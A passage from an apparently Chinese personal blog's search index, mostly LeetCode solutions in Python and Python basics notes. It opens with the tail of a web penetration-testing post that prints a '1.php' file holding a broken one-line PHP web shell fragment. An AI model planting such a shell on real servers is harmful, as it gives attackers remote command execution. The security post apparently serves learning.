class="comment">#####################</span></span><br><span class="line"><span class="comment">########1.php内容#####</span></span><br><span class="line">&lt;?php <span class="variable">$_POST</span>[1] &gt;</span><br><span class="line"><span class="comment">#####################</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>74-搜索二维矩阵</title>
      <link href="/2020/08/13/Leetcode/74%E3%80%81%E6%90%9C%E7%B4%A2%E4%BA%8C%E7%BB%B4%E7%9F%A9%E9%98%B5/"/>
      <url>/2020/08/13/Leetcode/74%E3%80%81%E6%90%9C%E7%B4%A2%E4%BA%8C%E7%BB%B4%E7%9F%A9%E9%98%B5/</url>
      
        <content type="html"><![CDATA[<h2 id="74、搜索二维矩阵"><a href="#74、搜索二维矩阵" class="headerlink" title="74、搜索二维矩阵"></a>74、搜索二维矩阵</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p><a href="https://imgchr.com/i/d9nI1J"><img src="https://s1.ax1x.com/2020/08/13/d9nI1J.png" alt="d9nI1J.png"></a></p><p>矩阵想象成一个一行的矩阵，然后二分查找即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">searchMatrix</span>(<span class="params">self, matrix: List[List[int]], target: int</span>) -&gt; bool:</span></span><br><span class="line">        n = len(matrix)</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        m = len(matrix[<span class="number">0</span>])</span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        right = m * n - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">            index = (right + left) // <span class="number">2</span></span><br><span class="line">            row = index // m</span><br><span class="line">            col = index % m</span><br><span class="line">            <span class="keyword">if</span> matrix[row][col] &gt; target:</span><br><span class="line">                right = index - <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> matrix[row][col] &lt; target:</span><br><span class="line">                left = index + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Leetcode题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>133-克隆图</title>
      <link href="/2020/08/12/Leetcode/133%E3%80%81%E5%85%8B%E9%9A%86%E5%9B%BE/"/>
      <url>/2020/08/12/Leetcode/133%E3%80%81%E5%85%8B%E9%9A%86%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<h2 id="133、克隆图"><a href="#133、克隆图" class="headerlink" title="133、克隆图"></a>133、克隆图</h2><p><a href="https://leetcode-cn.com/problems/clone-graph/">https://leetcode-cn.com/problems/clone-graph/</a></p><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><p><a href="https://imgchr.com/i/axAofP"><img src="https://s1.ax1x.com/2020/08/12/axAofP.png" alt="axAofP.png"></a></p><h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p>所谓深度克隆图，就是对图中每一个节点都new出来，而不是引用。因此就需要DFS深度遍历，此题节点对象中的neighbors是邻接矩阵，对于无向图来说，1——2相连，那么矩阵[0]中有2，矩阵[1]中有1，相当于两个点互相有向指向，因此需要处理重复遍历的问题。所以使用了字典（类似于hashmap），主键是node对象，值是深克隆的node_copy，递归遍历，将第一个点的所有邻居都递归遍历一边后，完成深克隆。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># Definition for a Node.</span></span><br><span class="line"><span class="string">class Node:</span></span><br><span class="line"><span class="string">    def __init__(self, val = 0, neighbors = []):</span></span><br><span class="line"><span class="string">        self.val = val</span></span><br><span class="line"><span class="string">        self.neighbors = neighbors</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cloneGraph</span>(<span class="params">self, node: <span class="string">&#x27;Node&#x27;</span></span>) -&gt; &#x27;Node&#x27;:</span></span><br><span class="line">        map_ = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">node</span>):</span></span><br><span class="line">            <span class="keyword">if</span> node <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">if</span> node <span class="keyword">in</span> map_:</span><br><span class="line">                <span class="keyword">return</span> map_[node]</span><br><span class="line">            clone = Node(node.val, [])</span><br><span class="line">            map_[node] = clone</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> node.neighbors:</span><br><span class="line">                clone.neighbors.append(dfs(i))</span><br><span class="line">            <span class="keyword">return</span> clone</span><br><span class="line">        <span class="keyword">return</span> dfs(node)    </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Leetcode题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>73-矩阵置零</title>
      <link href="/2020/08/08/Leetcode/73%E3%80%81%E7%9F%A9%E9%98%B5%E7%BD%AE%E9%9B%B6/"/>
      <url>/2020/08/08/Leetcode/73%E3%80%81%E7%9F%A9%E9%98%B5%E7%BD%AE%E9%9B%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="73、矩阵置零"><a href="#73、矩阵置零" class="headerlink" title="73、矩阵置零"></a>73、矩阵置零</h2><p><a href="https://leetcode-cn.com/problems/set-matrix-zeroes/">https://leetcode-cn.com/problems/set-matrix-zeroes/</a></p><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><p><a href="https://imgchr.com/i/axZSMT"><img src="https://s1.ax1x.com/2020/08/12/axZSMT.png" alt="axZSMT.png"></a></p><h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p>此题主要考点是如何减少空间复杂度，原地将矩阵该置零的位置置零。思路是先判断第一列和第一行是否有零，用两个布尔变量来记录这一结果。然后遍历除第一行和第一列的整个矩阵，一旦发现零，就在第一行和第一列的对应位置上置零。这样记录完毕后，再次遍历一边，只要发现对应位置上的第一行或第一列有0，则说明此点的行和列应被清零。最后，根据两个布尔变量，判断第一行和第一列是否需要清零即可。</p><p>Leetcode解题大佬真滴牛，学习了学习了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setZeroes</span>(<span class="params">self, matrix: List[List[int]]</span>) -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Do not return anything, modify matrix in-place instead.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        row0_flag = <span class="literal">False</span></span><br><span class="line">        col0_flag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(matrix)):</span><br><span class="line">            <span class="keyword">if</span> matrix[i][<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">                col0_flag = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(matrix[<span class="number">0</span>])):</span><br><span class="line">            <span class="keyword">if</span> matrix[<span class="number">0</span>][i] == <span class="number">0</span>:</span><br><span class="line">                row0_flag = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(matrix)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, len(matrix[<span class="number">0</span>])):</span><br><span class="line">                <span class="keyword">if</span> matrix[i][j] == <span class="number">0</span>:</span><br><span class="line">                    matrix[i][<span class="number">0</span>] = matrix[<span class="number">0</span>][j] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(matrix)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, len(matrix[<span class="number">0</span>])):</span><br><span class="line">                <span class="keyword">if</span> matrix[i][<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">or</span> matrix[<span class="number">0</span>][j] == <span class="number">0</span>:</span><br><span class="line">                    matrix[i][j] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> row0_flag == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(matrix[<span class="number">0</span>])):</span><br><span class="line">                matrix[<span class="number">0</span>][i] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> col0_flag == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(matrix)):</span><br><span class="line">                matrix[i][<span class="number">0</span>] = <span class="number">0</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Leetcode题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>71-最小路径和</title>
      <link href="/2020/08/08/Leetcode/71%E3%80%81%E7%AE%80%E5%8C%96%E8%B7%AF%E5%BE%84/"/>
      <url>/2020/08/08/Leetcode/71%E3%80%81%E7%AE%80%E5%8C%96%E8%B7%AF%E5%BE%84/</url>
      
        <content type="html"><![CDATA[<h2 id="71、简化路径"><a href="#71、简化路径" class="headerlink" title="71、简化路径"></a>71、简化路径</h2><p><a href="https://leetcode-cn.com/problems/simplify-path/">https://leetcode-cn.com/problems/simplify-path/</a></p><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><p><a href="https://imgchr.com/i/a5mPGn"><img src="https://s1.ax1x.com/2020/08/08/a5mPGn.png" alt="a5mPGn.png"></a></p><h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p>以’/‘为标记分割字符串，双//会出现空，.和..分别代表当前路径和上层路径，分开处理即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">simplifyPath</span>(<span class="params">self, path: str</span>) -&gt; str:</span></span><br><span class="line">        stack = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> path.split(<span class="string">&#x27;/&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;..&#x27;</span>]:</span><br><span class="line">                stack.append(i)</span><br><span class="line">            <span class="keyword">elif</span> i == <span class="string">&#x27;..&#x27;</span> <span class="keyword">and</span> stack:</span><br><span class="line">                stack.pop()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;/&#x27;</span> + <span class="string">&#x27;/&#x27;</span>.join(stack)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Leetcode题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>64-最小路径和</title>
      <link href="/2020/08/07/Leetcode/64%E3%80%81%E6%9C%80%E5%B0%8F%E8%B7%AF%E5%BE%84%E5%92%8C/"/>
      <url>/2020/08/07/Leetcode/64%E3%80%81%E6%9C%80%E5%B0%8F%E8%B7%AF%E5%BE%84%E5%92%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="64、最小路径和"><a href="#64、最小路径和" class="headerlink" title="64、最小路径和"></a>64、最小路径和</h2><p><a href="https://leetcode-cn.com/problems/minimum-path-sum/">https://leetcode-cn.com/problems/minimum-path-sum/</a></p><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><p><a href="https://imgchr.com/i/aho1hV"><img src="https://s1.ax1x.com/2020/08/07/aho1hV.png" alt="aho1hV.png"></a></p><h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p>此题和63、62相同类型，动态规划，把一个大问题分解成相互独立的若干个小问题。把求起点到终点的最短路径，分解为到终点(i，j)的最短距离Q(i，j)= min（Q(i-1，j)，Q(i，j-1)）+ Q(i，j)，因为只能向右走或者向左走！</p><p>所以我们可以进行第0行和第0列的初始化，因为<u>机器人只能向右或者向下走</u>，所以到达第0行，和第0列每个点的最小路径和一定是固定的。比如说第0行，要想到达第0行的任一元素，就必须从该元素的左边走过去；第0列也同样，必须从该元素的上面下来。</p><p>进行初始化后，我们就可以遍历所有点，进行Q(i，j)= min（Q(i-1，j)，Q(i，j-1)）+ Q(i，j)的计算，最后得到最小路径和。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minPathSum</span>(<span class="params">self, grid: List[List[int]]</span>) -&gt; int:</span></span><br><span class="line">        n = len(grid)</span><br><span class="line">        m = len(grid[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            <span class="keyword">if</span> i != <span class="number">0</span>:</span><br><span class="line">                grid[i][<span class="number">0</span>] += grid[i<span class="number">-1</span>][<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">            <span class="keyword">if</span> i != <span class="number">0</span>:</span><br><span class="line">                grid[<span class="number">0</span>][i] += grid[<span class="number">0</span>][i<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, m):</span><br><span class="line">                grid[i][j] += min(grid[i<span class="number">-1</span>][j], grid[i][j<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">return</span> grid[n<span class="number">-1</span>][m<span class="number">-1</span>]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Leetcode题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1、python基础</title>
      <link href="/2020/08/07/%E9%98%B6%E6%AE%B5%E4%BA%94%E3%80%81Python/Python/"/>
      <url>/2020/08/07/%E9%98%B6%E6%AE%B5%E4%BA%94%E3%80%81Python/Python/</url>
      
        <content type="html"><![CDATA[<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h3 id="一、Python的特点"><a href="#一、Python的特点" class="headerlink" title="一、Python的特点"></a>一、Python的特点</h3><p><a href="https://imgchr.com/i/aj5ehT"><img src="https://s1.ax1x.com/2020/08/12/aj5ehT.png" alt="aj5ehT.png"></a></p><h3 id="二、Python基础"><a href="#二、Python基础" class="headerlink" title="二、Python基础"></a>二、Python基础</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#############输出</span></span><br><span class="line">print(*objects, sep=<span class="string">&#x27; &#x27;</span>, end=<span class="string">&#x27;\n&#x27;</span>, file=sys.stdout, flush=<span class="literal">False</span>)</span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)    <span class="comment">#输出两个东西 默认空格分隔</span></span><br><span class="line">print(<span class="string">&quot;%d/s&quot;</span>%变量名)</span><br><span class="line">print(<span class="string">&#x27;&#123;0&#125;,&#123;0&#125;,&#123;1&#125;,&#123;1&#125;&#x27;</span>.format(值<span class="number">0</span>，值<span class="number">1</span>))</span><br><span class="line">print(<span class="string">f&quot;我的变量是<span class="subst">&#123;变量名&#125;</span>&quot;</span>)    <span class="comment">#python3新特性</span></span><br><span class="line"><span class="comment">##########输入</span></span><br><span class="line">val = input(<span class="string">&#x27;输入提示&#x27;</span>)    <span class="comment">#如果需要输入指定的数据类型需要强转int(intput())</span></span><br><span class="line"><span class="comment">#数据类型的转换：https://www.runoob.com/python3/python3-data-type.html</span></span><br><span class="line"><span class="comment">##########python的注释</span></span><br><span class="line"><span class="comment"># 和 三个双引号或单引号 作为多行注释使用</span></span><br><span class="line"><span class="comment">##########python的运算符</span></span><br><span class="line">/ <span class="comment">#浮点除 // #整除 ** #求幂</span></span><br><span class="line"><span class="keyword">in</span>、<span class="keyword">not</span> <span class="keyword">in</span> <span class="comment">#成员运算符，判断一个变量或值是否在某个容器中(字符串、列表元组)</span></span><br><span class="line">a, b, c = <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> / a = b = c = <span class="number">1</span> <span class="comment">#python允许多个变量同时赋值</span></span><br><span class="line"><span class="comment">##########python进制表示与转换</span></span><br><span class="line"><span class="number">0</span>bXX bin()/<span class="number">0</span>OXX oct()/XX int()/<span class="number">0</span>xXX hex() <span class="comment">#二进制 #八进制 #十进制 #十六进制</span></span><br><span class="line">ord()    <span class="comment">#字符转ASCII码</span></span><br><span class="line">chr()    <span class="comment">#接受一个单字节ASCII码整数值，返回一个字符</span></span><br><span class="line"><span class="comment">#########常见内建函数</span></span><br><span class="line"><span class="string">&quot;https://www.runoob.com/python3/python3-built-in-functions.html&quot;</span></span><br><span class="line">abs()；tuple()；list()；pow()；</span><br><span class="line">divmod(a,b)    <span class="comment">#返回a除b所得的商和余数的元组类型</span></span><br><span class="line">round(数,舍入的位数)    <span class="comment">#对浮点数进行四舍五入计算，遇5时奇进偶不进，银行家舍入。</span></span><br><span class="line">reversed()    <span class="comment">#返回逆向的迭代器</span></span><br><span class="line">sorted(iterable, key=<span class="literal">None</span>, reverse=<span class="literal">False</span>)     <span class="comment">#排序，key是比较的元素，reverse是否降序</span></span><br><span class="line">enumerate(sequence, [start=<span class="number">0</span>])    <span class="comment">#将一个序列转为一个每一个元素都包括值和下标的序列，for循环直接遍历，或者使用list()、tuple()、dict()，进行强转获得一个新的每个元素都具有值和下表的数据类型</span></span><br><span class="line">zip()/zip(*)    <span class="comment">#将多列表中的元素一一组合压缩为元组，或者解压，如果列表长度不一致，则只组合最短的长度。</span></span><br><span class="line">str.center(width, fillchar)    <span class="comment">#字符串以width宽度居中，左右填充fillchar</span></span><br><span class="line">str.strip([char])    <span class="comment">#删除str头和尾的char字符，如果没指定char，默认是空格</span></span><br><span class="line">str.upper()/lower()    <span class="comment">#转换字符串中的大小写转换</span></span><br><span class="line">str.split(separator=<span class="string">&quot;&quot;</span>, num=string.count(XX))    <span class="comment">#以separator为分隔符截取num+1个字符串</span></span><br><span class="line">str.replace(old, new [, max])    <span class="comment">#将str中的old换成new，如果max指定替换不超过max次</span></span><br><span class="line">max()/min()/sum()    <span class="comment">#从一个序列中找到最大值/最小值/得到和</span></span><br><span class="line"><span class="comment">##########格式化操作符</span></span><br><span class="line">%s；%d；%e(科学计数法)；%f</span><br><span class="line">-    <span class="comment">#左对齐</span></span><br><span class="line">+    <span class="comment">#正负数前面打印政府符号</span></span><br><span class="line">%<span class="number">.3</span>f/%<span class="number">3</span>s    <span class="comment">#浮点小数精度、宽度</span></span><br></pre></td></tr></table></figure><h3 id="三、Python的标准数据类型"><a href="#三、Python的标准数据类型" class="headerlink" title="三、Python的标准数据类型"></a>三、Python的标准数据类型</h3><p>Python3 中有六个标准的数据类型：</p><ul><li>Number（数字）</li><li>String（字符串）</li><li>List（列表）</li><li>Tuple（元组）</li><li>Set（集合）</li><li>Dictionary（字典）</li></ul><p>Python3 的六个标准数据类型中：</p><ul><li><strong>不可变数据（3 个）：</strong>Number（数字）、String（字符串）、Tuple（元组）；</li><li><strong>可变数据（3 个）：</strong>List（列表）、Dictionary（字典）、Set（集合）。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#############字符串</span></span><br><span class="line">+ 连接字符串， * 复制字符串，[:]截取字符串，空为前所有或后所有，<span class="number">-1</span>为尾，字符串前加r/R，表示转义符号无效；\ 也可作为续行符;<span class="string">f&quot;<span class="subst">&#123;arg&#125;</span>&quot;</span></span><br><span class="line">split()    <span class="comment">#按分隔符取字符串</span></span><br><span class="line">template = string.Template(<span class="string">&quot;hi $&#123;name&#125;,I will see u $&#123;day&#125;&quot;</span>)    <span class="comment">#string模块的template</span></span><br><span class="line">template.substitute(name = <span class="string">&#x27;bob&#x27;</span>, day = <span class="string">&#x27;tomorrow&#x27;</span>)    <span class="comment">#string.template</span></span><br><span class="line"><span class="comment">###########列表</span></span><br><span class="line">列表截取操作与字符串相同，多了第三个参数：步长 [::]</span><br><span class="line">创建列表的快捷方式：[表达式 <span class="keyword">for</span> 变量 <span class="keyword">in</span> range()];[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">5</span>)]</span><br><span class="line"><span class="string">&#x27;分隔符&#x27;</span>.join(序列)    <span class="comment">#将列表组合为字符串</span></span><br><span class="line"><span class="keyword">del</span> list[idx] / list.remove(val) / list.pop()    <span class="comment">#删除列表元素</span></span><br><span class="line">list.count(obj)    <span class="comment">#统计列表中obj的数量</span></span><br><span class="line">list.extend(seq)    <span class="comment">#追加一个序列到列表中</span></span><br><span class="line">list.insert(idx,obj)    <span class="comment">#插入元素到某一位置</span></span><br><span class="line">list.index(x[, start[, end]])    <span class="comment">#在列表中找到某个值第一个匹配项的位置</span></span><br><span class="line"><span class="comment">###########元组(Tuple）)</span></span><br><span class="line">(val,val,val)    :元组和列表类似，但不能修改元素内容，截取方法和字符串类似。</span><br><span class="line">tuple([val,val]) / (val)    <span class="comment">#第二种如果是一个值要加逗号，否则认为是一个字符串 </span></span><br><span class="line"><span class="comment">###########集合(set)</span></span><br><span class="line">&#123;&#125;:创建一个空集合必须用set()，因为&#123;&#125;表示创建一个空字典</span><br><span class="line">集合运算：a-b-&gt;a和b的差集; a|b-&gt;a和b的并集; a&amp;b-&gt;a和b的交集; a^b-&gt;a和b不同时存在的元素</span><br><span class="line"><span class="comment">###########字典Dictionary(java/c++ 中的map)</span></span><br><span class="line">&#123;key:value&#125;</span><br><span class="line">dict()可直接创建字典：dict([(key,value),(key,value)])</span><br></pre></td></tr></table></figure><h3 id="四、Python的循环语句"><a href="#四、Python的循环语句" class="headerlink" title="四、Python的循环语句"></a>四、Python的循环语句</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>和<span class="keyword">for</span>语句支持<span class="keyword">else</span>，循环结束后执行。</span><br><span class="line">range(起始，结束，步长)</span><br></pre></td></tr></table></figure><h3 id="五、文件操作"><a href="#五、文件操作" class="headerlink" title="五、文件操作"></a>五、文件操作</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">文件对象 = open(file, mode=<span class="string">&#x27;r&#x27;</span>, buffering=<span class="number">-1</span>, encoding=<span class="literal">None</span>, errors=<span class="literal">None</span>, newline=<span class="literal">None</span>, closefd=<span class="literal">True</span>, opener=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">fileObject.read(size);    <span class="comment">#size为或负 空则全读 </span></span><br><span class="line">fileObject.close();</span><br><span class="line">fileObject.readline();    <span class="comment">#也可size</span></span><br><span class="line">fileObject.readlines();    <span class="comment">#把所有行读给列表</span></span><br><span class="line">fileObject.writelines();    <span class="comment">#把字符串列表写给文件</span></span><br><span class="line"><span class="keyword">for</span> eachLine <span class="keyword">in</span> fobj:    <span class="comment">#逐行处理文件</span></span><br><span class="line">data.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>file: 必需，文件路径（相对或者绝对路径）。</li><li>mode: 可选，文件打开模式</li><li>buffering: 设置缓冲</li><li>encoding: 一般使用utf8</li><li>errors: 报错级别</li><li>newline: 区分换行符</li><li>closefd: 传入的file参数类型</li><li>opener:</li></ul><p>mode 参数有(默认t)：</p><table><thead><tr><th>模式</th><th>描述</th></tr></thead><tbody><tr><td>t</td><td>文本模式 (默认)。</td></tr><tr><td>x</td><td>写模式，新建一个文件，如果该文件已存在则会报错。</td></tr><tr><td>b</td><td>二进制模式。</td></tr><tr><td>+</td><td>打开一个文件进行更新(可读可写)。</td></tr><tr><td>U</td><td>通用换行模式（<strong>Python 3 